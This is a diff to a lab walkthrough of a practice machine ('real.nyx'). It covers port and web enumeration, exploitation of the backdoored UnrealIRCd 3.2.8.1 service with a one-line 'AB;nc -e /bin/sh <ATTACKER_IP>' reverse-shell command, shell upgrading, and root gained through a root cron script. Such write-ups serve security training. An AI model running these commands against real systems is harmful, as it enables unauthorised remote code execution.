@@ -14,7 +14,9 @@ The IRC service running here is a trojaned build of UnrealIRCd 3.2.8.1, with a w
 
 ## Enumeration
 
-A full TCP port scan is run first:
+### Port Enumeration
+
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn real.nyx
@@ -28,7 +30,7 @@ PORT     STATE  SERVICE      REASON
 MAC Address: 08:00:27:29:88:9E (Oracle VirtualBox virtual NIC)
 ```
 
-Five ports are found open: **22 (SSH)**, **80 (HTTP)**, **6667**, **6697**, and **8067** — the first two are the standard plaintext and TLS ports for IRC. A version/script scan against all five fills in the details:
+Five ports come back open: **22 (SSH)**, **80 (HTTP)**, **6667**, **6697**, and **8067** — the first two of those are the standard plaintext and TLS ports for IRC. A version/script scan against all five fills in the details:
 
 ```bash
 $ sudo nmap -p 22,80,6667,6697,8067 -sCV real.nyx
@@ -49,9 +51,11 @@ MAC Address: 08:00:27:29:88:9E (Oracle VirtualBox virtual NIC)
 Service Info: Host: irc.foonet.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+`UnrealIRCd` is the standout here — a specific daemon with a notorious history, worth checking against its known backdoor before touching anything else.
+
 ### Checking for the UnrealIRCd Backdoor
 
-The IRC service's version is worth checking against a specific, well-known issue directly:
+`nmap` ships a script that checks this exact service against that specific, well-known issue:
 
 ```bash
 $ sudo nmap -p6667 --script="irc-unrealircd-backdoor" real.nyx
@@ -66,10 +70,15 @@ Between 2009 and 2010, a compromised build of UnrealIRCd 3.2.8.1 circulated with
 
 ### Web Enumeration
 
+The web server is just the stock Apache default page, with nothing to work with:
+
 ```
 http://real.nyx
 ```
+
 <img src="../Images/real/Pasted image 20260729135010.png"/>
+
+A content scan confirms it, turning up only the default index and the usual forbidden entries:
 
 ```bash
 $ ffuf -u http://real.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic
@@ -87,6 +96,8 @@ server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration:
 
 ### IRC Enumeration
 
+Before firing the backdoor, a plain connection to the IRC port and an `ADMIN` query pulls the server's administrative contact details — useful context, and a potential username (`bob`):
+
 ```bash
 $ nc -vn real.nyx 6667
 (UNKNOWN) [real.nyx] 6667 (ircd) open
@@ -102,6 +113,8 @@ ADMIN
 ## Initial Access
 
 ### RCE via the UnrealIRCd Backdoor
+
+The backdoor executes anything after `AB;` as a shell command, so a single line piped to the IRC port is enough to fire a reverse shell:
 
 ```bash
 $ echo "AB;nc -e /bin/sh <ATTACKER_IP> <PORT>" | nc real.nyx 6667
@@ -122,7 +135,7 @@ uid=1000(server) gid=1000(server) groups=1000(server)
 The shell is upgraded to something usable:
 
 ```bash
-python3 -c 'import pty; pty.spawn ("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 [Ctrl + z]
 stty raw -echo; fg
 export TERM=xterm
@@ -167,12 +180,13 @@ server@real:/tmp$ ./pspy64
 2026/07/29 07:06:01 CMD: UID=0     PID=16805  | /bin/bash /opt/task
 ```
 
-A periodic task is caught running as root:
+A periodic task is caught running as root. Its script and permissions are worth reading before anything else:
 
 ```bash
 server@real:/tmp$ ls -l /opt/task
 -rwx-wr-r-- 1 root root 277 May  3  2023 /opt/task
 ```
+
 ```bash
 server@real:/tmp$ cat /opt/task
 #!/bin/bash
@@ -227,7 +241,7 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ```bash
-python3 -c 'import pty; pty.spawn ("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 [Ctrl + z]
 stty raw -echo; fg
 export TERM=xterm
